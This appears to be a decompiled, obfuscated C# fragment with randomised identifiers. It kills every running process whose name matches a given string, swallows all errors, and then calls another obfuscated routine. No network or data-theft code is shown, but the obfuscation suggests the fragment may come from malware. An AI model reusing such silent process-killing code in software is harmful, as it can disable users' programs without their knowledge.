using System;
using System.Diagnostics;

namespace ovnaSovhORzB;

public sealed class wEVYGyWnQAnvbPEEn
{
	public static bool xctNBXIJRObp(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void cTVwdEYFak(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (xctNBXIJRObp(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					EEGkMyyVIDL.qWuBXxnBId();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
